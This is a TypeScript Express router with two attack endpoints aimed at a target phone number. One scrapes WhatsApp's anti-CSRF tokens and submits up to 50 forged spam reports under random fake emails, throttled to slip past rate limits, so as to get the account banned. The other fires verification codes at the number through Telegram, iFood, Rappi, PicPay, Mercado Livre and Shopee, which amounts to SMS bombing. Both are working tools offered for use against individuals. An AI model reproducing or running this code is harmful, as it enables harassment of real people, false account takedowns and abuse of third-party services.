import { Router }   from "express";
import { spawn }    from "child_process";
import * as fs      from "fs";

const router = Router();

// ── curl helper ──────────────────────────────────────────────────────────────
interface CurlResult { statusCode: number; body: string }

function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
  return new Promise((resolve, reject) => {
    const child = spawn("curl", [
      "--silent", "--show-error", "--max-time", String(Math.ceil(timeoutMs / 1000)),
      "--write-out", "\n---STATUS:%{http_code}---",
      "--compressed", "-L",
      ...argv,
    ]);
    let out = "";
    let err = "";
    child.stdout.on("data", (d: Buffer) => { out += d.toString(); });
    child.stderr.on("data", (d: Buffer) => { err += d.toString(); });
    const timer = setTimeout(() => { child.kill("SIGKILL"); reject(new Error("CURL_28:TIMEOUT")); }, timeoutMs + 2000);
    child.on("close", () => {
      clearTimeout(timer);
      const sep = out.lastIndexOf("---STATUS:");
      const body = sep >= 0 ? out.slice(0, sep).trimEnd() : out.trimEnd();
      const code = sep >= 0 ? parseInt(out.slice(sep + 10).replace("---", ""), 10) : 0;
      resolve({ statusCode: isNaN(code) ? 0 : code, body });
    });
    child.on("error", (e) => { clearTimeout(timer); reject(e); });
  });
}

// ── Number normaliser ─────────────────────────────────────────────────────────
// Accepts "11999887766", "5511999887766", "+5511999887766", "(11) 9 9988-7766"
function normaliseNumber(raw: string): { e164: string; cc: string; subscriber: string } | null {
  const digits = raw.replace(/\D/g, "");
  let full = digits;
  if (digits.length === 10 || digits.length === 11) full = `55${digits}`;
  if (full.length < 10 || full.length > 15) return null;
  const cc = full.startsWith("55") ? "55" : full.slice(0, 2);
  const subscriber = full.slice(cc.length);
  return { e164: `+${full}`, cc, subscriber };
}

// ── POST /whatsapp/report ─────────────────────────────────────────────────────
// Submits multiple abuse reports for a WhatsApp number via Meta's contact form.
router.post("/whatsapp/report", async (req, res): Promise<void> => {
  const { number, quantity } = req.body as { number?: string; quantity?: number | string };
  if (!number) { res.status(400).json({ error: "number é obrigatório" }); return; }

  const num = normaliseNumber(String(number));
  if (!num) { res.status(400).json({ error: "Número inválido" }); return; }

  const qty = Math.min(Math.max(1, parseInt(String(quantity ?? 1), 10)), 50);

  let sent    = 0;
  const fails: string[] = [];

  for (let i = 0; i < qty; i++) {
    const ckFile = `/tmp/wa_rep_${Date.now()}_${i}.txt`;
    try {
      // Step 1: GET the contact page (noscript) to obtain DTSG token + cookies
      const pageRes = await runCurl([
        "-c", ckFile,
        "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "-H", "Accept: text/html,application/xhtml+xml",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        "-H", "Sec-Fetch-Site: none",
        "-H", "Sec-Fetch-Mode: navigate",
        "https://www.whatsapp.com/contact/?subject=Abuse&_fb_noscript=1",
      ], 15_000);

      // Extract DTSG token (Facebook anti-CSRF)
      const dtsgMatch = pageRes.body.match(/"token":"(Ad[A-Za-z0-9_-]{10,})"/);
      const dtsg = dtsgMatch?.[1] ?? "";
      if (!dtsg) {
        fails.push(`r${i + 1}:no_dtsg`);
        continue;
      }

      // Extract jazoest (numeric anti-replay)
      const jazoestMatch = pageRes.body.match(/jazoest=(\d+)/);
      const jazoest = jazoestMatch?.[1] ?? "2";

      // Extract LSD token
      const lsdMatch = pageRes.body.match(/"LSD",[^,]*,"token":"([^"]+)"/);
      const lsd = lsdMatch?.[1] ?? "";

      // Step 2: POST the abuse report form
      const body = new URLSearchParams({
        fb_dtsg:      dtsg,
        jazoest:      jazoest,
        lsd:          lsd,
        subject:      "spam_unwanted",
        phone_number: num.e164,
        email:        `report${Math.random().toString(36).slice(2, 8)}@gmail.com`,
        name:         "Usuário WhatsApp",
        content:      "Este número está enviando spam e mensagens não solicitadas repetidamente.",
        category:     "spam",
        _subject:     "Denúncia de Abuso",
      }).toString();

      const postRes = await runCurl([
        "-X", "POST",
        "-b", ckFile,
        "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Origin: https://www.whatsapp.com",
        "-H", "Referer: https://www.whatsapp.com/contact/?subject=Abuse",
        "-H", "Accept: text/html,application/xhtml+xml,*/*;q=0.9",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        "--data-raw", body,
        "https://www.whatsapp.com/contact/",
      ], 15_000);

      if (postRes.statusCode === 200 || postRes.statusCode === 302) {
        sent++;
      } else {
        fails.push(`r${i + 1}:http_${postRes.statusCode}`);
      }
    } catch (e) {
      fails.push(`r${i + 1}:${String(e).slice(0, 40)}`);
    } finally {
      try { fs.unlinkSync(ckFile); } catch { /**/ }
    }

    // Throttle between reports to avoid rate-limiting
    if (i < qty - 1) await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
  }

  res.json({
    number:     num.e164,
    requested:  qty,
    sent,
    failed:     qty - sent,
    errors:     fails.length ? fails : undefined,
  });
});

// ── POST /whatsapp/sendcode ───────────────────────────────────────────────────
// Fires OTP / verification codes to a phone number via multiple services.
router.post("/whatsapp/sendcode", async (req, res): Promise<void> => {
  const { number } = req.body as { number?: string };
  if (!number) { res.status(400).json({ error: "number é obrigatório" }); return; }

  const num = normaliseNumber(String(number));
  if (!num) { res.status(400).json({ error: "Número inválido" }); return; }

  type ServiceResult = { service: string; status: "sent" | "failed"; detail?: string };
  const results: ServiceResult[] = [];

  // Helper to push result
  const push = (service: string, ok: boolean, detail?: string) =>
    results.push({ service, status: ok ? "sent" : "failed", ...(detail ? { detail } : {}) });

  // ─── Service 1: Telegram ──────────────────────────────────────────────────
  try {
    const r = await runCurl([
      "-X", "POST",
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
      "-H", "X-Requested-With: XMLHttpRequest",
      "-H", "Origin: https://my.telegram.org",
      "-H", "Referer: https://my.telegram.org/auth",
      "--data", `phone=${encodeURIComponent(num.e164)}`,
      "https://my.telegram.org/auth/send_password",
    ], 12_000);
    push("Telegram", r.body.includes("random_hash"), r.body.includes("random_hash") ? undefined : r.body.slice(0, 80));
  } catch (e) { push("Telegram", false, String(e).slice(0, 60)); }

  // ─── Service 2: iFood ─────────────────────────────────────────────────────
  try {
    const r = await runCurl([
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: iFood/23.0 Android/33",
      "-H", "Accept: application/json",
      "-H", "platform: Android",
      "-H", "version: 23.0.0",
      "-H", "Origin: https://www.ifood.com.br",
      "--data-raw", JSON.stringify({ phone: num.e164 }),
      "https://marketplace.ifood.com.br/v2/identity/sendCode",
    ], 12_000);
    const ok = r.statusCode === 200 || r.statusCode === 201 ||
               r.body.toLowerCase().includes("code") || r.body.toLowerCase().includes("sent");
    push("iFood", ok, ok ? undefined : `http_${r.statusCode}`);
  } catch (e) { push("iFood", false, String(e).slice(0, 60)); }

  // ─── Service 3: Rappi ─────────────────────────────────────────────────────
  try {
    const r = await runCurl([
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: Rappi/10.34.0 Android",
      "-H", "Accept: application/json",
      "-H", "Origin: https://www.rappi.com.br",
      "--data-raw", JSON.stringify({ phone: num.e164, countryCode: num.cc }),
      "https://services.rappi.com.br/api/v2/auth/sms",
    ], 12_000);
    const ok = r.statusCode === 200 || r.statusCode === 201 || r.body.includes("success");
    push("Rappi", ok, ok ? undefined : `http_${r.statusCode}`);
  } catch (e) { push("Rappi", false, String(e).slice(0, 60)); }

  // ─── Service 4: PicPay ───────────────────────────────────────────────────
  try {
    const r = await runCurl([
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: PicPay/21.0 Android",
      "-H", "Accept: application/json",
      "-H", "x-picpay-client-id: picpay-android",
      "--data-raw", JSON.stringify({ phone: num.e164 }),
      "https://api.picpay.com/v3/user/phone/verify",
    ], 12_000);
    const ok = r.statusCode === 200 || r.statusCode === 201 || r.body.includes("sent");
    push("PicPay", ok, ok ? undefined : `http_${r.statusCode}`);
  } catch (e) { push("PicPay", false, String(e).slice(0, 60)); }

  // ─── Service 5: Mercado Livre ─────────────────────────────────────────────
  try {
    const r = await runCurl([
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: MercadoLibre/8.0 Android",
      "-H", "Accept: application/json",
      "-H", "x-platform: mobile",
      "--data-raw", JSON.stringify({ phone: num.e164 }),
      "https://api.mercadolibre.com/users/checkpoints/phone/send_code",
    ], 12_000);
    const ok = r.statusCode === 200 || r.statusCode === 201 || r.body.includes("code_sent");
    push("MercadoLivre", ok, ok ? undefined : `http_${r.statusCode}`);
  } catch (e) { push("MercadoLivre", false, String(e).slice(0, 60)); }

  // ─── Service 6: Shopee ───────────────────────────────────────────────────
  try {
    const r = await runCurl([
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: Shopee/3.0 Android",
      "-H", "Accept: application/json",
      "--data-raw", JSON.stringify({ phone: num.subscriber, phone_country: `+${num.cc}`, type: 1 }),
      "https://shopee.com.br/api/v2/user/register_v2",
    ], 12_000);
    const ok = r.statusCode === 200 && (r.body.includes('"error":0') || r.body.includes('"code":0'));
    push("Shopee", ok, ok ? undefined : `http_${r.statusCode}`);
  } catch (e) { push("Shopee", false, String(e).slice(0, 60)); }

  const sentCount  = results.filter(r => r.status === "sent").length;
  const failCount  = results.filter(r => r.status === "failed").length;

  res.json({
    number:   num.e164,
    sent:     sentCount,
    failed:   failCount,
    total:    results.length,
    services: results,
  });
});

export default router;
